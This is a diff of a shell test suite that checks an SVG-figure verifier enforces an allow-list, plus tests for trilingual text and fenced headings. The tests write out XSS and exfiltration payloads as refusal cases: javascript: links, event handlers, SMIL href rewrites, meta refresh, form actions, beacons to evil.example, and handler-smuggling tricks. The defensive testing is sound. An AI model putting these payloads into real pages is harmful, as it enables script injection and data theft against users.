@@ -358,10 +358,17 @@ test_verify_holds_a_figure_to_the_svg_contract() {
   assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
     "a url() in a drawing points at a same-document #fragment" "a style that fetches off-origin"
   # The presentation-attribute form of the same property fetches the same way.
-  filtered='filter="url(//evil.example/f.svg#blur)" id="opt-box-end"'
+  clipped='clip-path="url(//evil.example/f.svg#blur)" id="opt-box-end"'
+  svg=${GOOD_SVG/id=\"opt-box-end\"/"$clipped"}
+  assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
+    "a url() in a drawing points at a same-document #fragment" "a clip-path that fetches off-origin"
+  # And an attribute the drawing vocabulary does not name is refused as itself,
+  # whatever it holds - there is no clause to spell around because there is no
+  # clause, only the list of what a drawing carries.
+  filtered='filter="url(#opt-blur)" id="opt-box-end"'
   svg=${GOOD_SVG/id=\"opt-box-end\"/"$filtered"}
   assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
-    "a url() in a drawing points at a same-document #fragment" "a filter attribute that fetches off-origin"
+    "a drawing carries only the attributes it draws with" "an attribute outside the drawing vocabulary"
   # SMIL sets the attribute at runtime, so an animation aimed at href reaches
   # the scheme the clause above refuses; motion itself stays welcome.
   animated='<a href="#opt-box-a"><set attributeName="href" to="javascript:alert(1)" begin="0s"/><rect id="opt-box-a" data-node="bound" x="24" y="24" width="220" height="80" fill="var(--card)"/></a><rect id="opt-box-a2"'
@@ -398,7 +405,7 @@ test_verify_holds_a_figure_to_the_svg_contract() {
     'colours come from the page' "an unquoted hex fill"
   svg=${GOOD_SVG/<rect id=\"opt-box-end\"/<rect onload=alert(1) id=\"opt-box-end\"}
   assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
-    "inline onload handler" "an unquoted event handler"
+    "a drawing carries only the attributes it draws with" "an unquoted event handler"
   # Every clause reads a value through one attribute map, and the browser takes
   # the FIRST of a duplicated attribute. A map that took the last would let a
   # drawing show the checker a harmless value and the reader the live one.
@@ -410,13 +417,28 @@ test_verify_holds_a_figure_to_the_svg_contract() {
   svg=${GOOD_SVG/<rect id=\"opt-box-end\"/$dup}
   assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
     'has fill="red"' "a baked colour hidden behind a duplicate attribute"
-  # A "<" inside an UNQUOTED value ends a pattern and does not end a value: the
-  # browser appends it and keeps reading the same tag. A reader that stopped
-  # there would never see the handler at all.
-  angle='<rect onclick=window.lavish.queuePrompt("x")<z id="opt-box-end"'
-  svg=${GOOD_SVG/<rect id=\"opt-box-end\"/$angle}
-  assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
-    "inline onclick handler" "a handler hidden behind a bare angle bracket"
+  # The checker names what a drawing MAY carry, so every one of these refuses
+  # for the same reason rather than each needing its own clause. Five of them
+  # are the five spellings that got past a pattern on this branch; the rest are
+  # HTML breakout markup, which ends the svg and reparses on the board.
+  local shape
+  for shape in \
+    '<meta http-equiv="refresh" content="0;url=https://evil.example/board"><rect id="opt-box-end"' \
+    '<button formaction="https://evil.example/collect">Choose</button><rect id="opt-box-end"' \
+    '<img src="https://evil.example/pixel"><rect id="opt-box-end"' \
+    '<p></p><div></div><br><table></table><rect id="opt-box-end"' \
+    '<iframe src="https://evil.example/"></iframe><rect id="opt-box-end"' \
+    '<rect formaction="https://evil.example/x" id="opt-box-end"' \
+    '<rect onpointerdown="alert(1)" id="opt-box-end"' \
+    '<rect/onclick="alert(1)" id="opt-box-end"' \
+    '<rect onclick=a("b")<z id="opt-box-end"' \
+    '<rect id="opt-box-end" onclick="alert(1)" onclick="0"' \
+  ; do
+    svg=${GOOD_SVG/<rect id=\"opt-box-end\"/$shape}
+    fill_figures "$packet" "$(good_figures "$svg")"
+    set +e; out=$(run_packet "$home" verify pk-1 2>&1); rc=$?; set -e
+    [ "$rc" -ne 0 ] || fail "verify accepted a drawing outside the contract: $shape"
+  done
   # And markup this reader cannot tokenize is refused rather than passed on the
   # word that it was checked: the page would tokenize it some other way.
   svg=${GOOD_SVG/<title id=\"opt-title\">/<!-- never closed <title id="opt-title">}
@@ -447,16 +469,16 @@ test_verify_holds_a_figure_to_the_svg_contract() {
   # 5. no external font reference, no script, no <style> element
   svg=${GOOD_SVG/<title id=\"opt-title\">/<style>@import url(https://fonts.googleapis.com/css2?family=Geist);</style><title id=\"opt-title\">}
   assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
-    "references an external font" "an imported web font"
+    "<style> is not a drawing" "an imported web font"
   # An inline <style> is not scoped to its svg: it restyles the whole served
   # page, so a drawing carries none at all.
   styled='<style>.pk-section{display:none}rect{fill:red}</style><title id="opt-title">'
   svg=${GOOD_SVG/<title id=\"opt-title\">/"$styled"}
   assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
-    "the svg carries a <style>" "a style element that restyles the page"
+    "<style> is not a drawing" "a style element that restyles the page"
   svg=${GOOD_SVG/<title id=\"opt-title\">/<script>void 0;<\/script><title id=\"opt-title\">}
   assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
-    "the svg carries a <script>" "a script inside the drawing"
+    "<script> is not a drawing" "a script inside the drawing"
   # The language switch replaces a label's whole text content, so a <tspan>
   # inside a <text> is destroyed the first time the captain switches.
   plain='<text x="34" y="54" style="font-family:var(--sans)" data-en="Raise the bound" data-hant="拉高上限" data-hans="拉高上限">Raise the bound</text>'
@@ -470,7 +492,7 @@ test_verify_holds_a_figure_to_the_svg_contract() {
   foreign='<foreignObject x="0" y="0" width="90" height="20"><div style="font-size:12px">SparkSQL</div></foreignObject><title id="opt-title">'
   svg=${GOOD_SVG/<title id=\"opt-title\">/"$foreign"}
   assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
-    "the svg carries a <foreignObject>" "HTML labels the language switch cannot reach"
+    "<foreignobject> is not a drawing" "HTML labels the language switch cannot reach"
   # The svg rides the page unescaped, so a link scheme the page's own prose
   # refuses must not reach it through a drawing, and nothing may fetch on open.
   svg=${GOOD_SVG/<rect id=\"opt-box-end\"/<a href=\"javascript:alert(1)\"><rect id=\"opt-box-end\"}
@@ -479,7 +501,7 @@ test_verify_holds_a_figure_to_the_svg_contract() {
     "only an <a> may leave the page" "a javascript: link inside the drawing"
   svg=${GOOD_SVG/<title id=\"opt-title\">/<image href=\"https:\/\/evil.example\/beacon.png\" x=\"0\" y=\"0\"\/><title id=\"opt-title\">}
   assert_figure_refused "$home" "$packet" "$(good_figures "$svg")" \
-    "same-document #fragment" "an image fetched from the network"
+    "<image> is not a drawing" "an image fetched from the network"
 
   # 6. a drawn connector needs an identity, and every identity needs evidence
   svg=${GOOD_SVG/ data-edge=\"quiet-to-end\"/}
@@ -980,6 +1002,64 @@ MARKER
 # writes a fenced block itself, so a "## " comment inside one is reachable from
 # the packet the tool generates - and a packet verify called clean has to be a
 # packet the captain can be shown.
+# Every string that reaches the card is either written in three languages or
+# is purely command, path or identifier material. There is no third case - a
+# heading under a section was one, and it stood still while its own lines moved.
+test_no_line_the_captain_reads_is_exempt_from_the_three_languages() {
+  local home packet out rc
+  home=$(make_home prose-sub-heading)
+  run_packet "$home" scaffold pk-1 >/dev/null || fail "scaffold failed"
+  packet="$home/data/pk-1/packet.md"
+  fill_prose "$packet"
+  python3 - "$packet" <<'SUBHEAD'
+import pathlib, sys
+p = pathlib.Path(sys.argv[1]); s = p.read_text()
+p.write_text(s.replace("- en: the bound is measured in forge(), not in the poller",
+                       "### What the trial measured\n- en: the bound is measured in forge(), not in the poller", 1))
+SUBHEAD
+  set +e; out=$(run_packet "$home" verify pk-1 2>&1); rc=$?; set -e
+  [ "$rc" -ne 0 ] || fail "verify accepted a heading that would stand still on the card: $out"
+  assert_contains "$out" "is a heading inside a packet section" \
+    "the refusal does not name the sub-heading: $out"
+  pass "no line the captain reads is exempt from the three languages"
+}
+
+# A link is one destination said in three languages. The card pairs the
+# languages of a line by position and carries one url, so three lines naming
+# different links would send the captain reading 繁體 to the English page.
+test_the_three_languages_of_a_line_name_the_same_links() {
+  local home packet out rc
+  home=$(make_home prose-link-langs)
+  run_packet "$home" scaffold pk-1 >/dev/null || fail "scaffold failed"
+  packet="$home/data/pk-1/packet.md"
+  fill_prose "$packet"
+  python3 - "$packet" <<'SAMELINK'
+import pathlib, sys
+p = pathlib.Path(sys.argv[1]); s = p.read_text()
+s = s.replace("- en: the bound is measured in forge(), not in the poller",
+              "- en: read the [design doc](https://ex.test/design)")
+s = s.replace("- hant: 上限是在 forge() 裡量的，不是在 poller",
+              "- hant: 讀[設計文件](https://ex.test/design)")
+s = s.replace("- hans: 上限是在 forge() 里量的，不是在 poller",
+              "- hans: 读[设计文件](https://ex.test/design)")
+p.write_text(s)
+SAMELINK
+  run_packet "$home" verify pk-1 >/dev/null \
+    || fail "verify refused three languages that name the same link"
+
+  python3 - "$packet" <<'OTHERLINK'
+import pathlib, sys
+p = pathlib.Path(sys.argv[1]); s = p.read_text()
+p.write_text(s.replace("- hant: 讀[設計文件](https://ex.test/design)",
+                       "- hant: 讀[設計文件](https://ex.test/zh/design)", 1))
+OTHERLINK
+  set +e; out=$(run_packet "$home" verify pk-1 2>&1); rc=$?; set -e
+  [ "$rc" -ne 0 ] || fail "verify accepted three languages pointing at different places: $out"
+  assert_contains "$out" "names different links from its" \
+    "the refusal does not name the disagreement: $out"
+  pass "the three languages of a line name the same links"
+}
+
 test_a_heading_inside_a_fence_is_a_line_of_code_to_both_readers() {
   local home packet out
   home=$(make_home prose-fenced-heading)
@@ -1003,6 +1083,19 @@ FENCE
          | index("## the two commands worth running first")) != null
   ' >/dev/null || fail "a fenced heading was read as a section: $out"
   run_packet "$home" render pk-1 >/dev/null || fail "render refused what verify accepted"
+
+  # Every reader of this packet decomposes it the same way, the figures scan
+  # included: a "## Figures" line inside a fence is code, not a second section.
+  python3 - "$packet" <<'FENCEDSECTION'
+import pathlib, sys
+p = pathlib.Path(sys.argv[1]); s = p.read_text()
+p.write_text(s.replace("```sh\n", "```sh\n## Figures\n## Evidence\n", 1))
+FENCEDSECTION
+  run_packet "$home" verify pk-1 >/dev/null \
+    || fail "a section name inside a fenced block was read as a section"
+  out=$(run_packet "$home" card pk-1) || fail "card could not read the same packet: $out"
+  printf '%s' "$out" | jq -e '(.packet.figures | length) == 1' >/dev/null \
+    || fail "the figures scan read a fenced line as a second Figures section: $out"
 
   # and the two read the heading itself the same way, trailing space included
   python3 - "$packet" <<'PAD'
@@ -1712,6 +1805,8 @@ test_verify_refuses_a_group_the_renderer_would_read_differently
 test_a_line_that_is_a_link_only_collapses_when_every_language_is
 test_a_backticked_line_is_code_on_both_surfaces
 test_a_section_the_scaffold_never_wrote_is_refused
+test_no_line_the_captain_reads_is_exempt_from_the_three_languages
+test_the_three_languages_of_a_line_name_the_same_links
 test_a_heading_inside_a_fence_is_a_line_of_code_to_both_readers
 test_the_packet_block_switches_every_heading_it_owns
 test_the_packet_block_reaches_the_card_in_all_three_languages
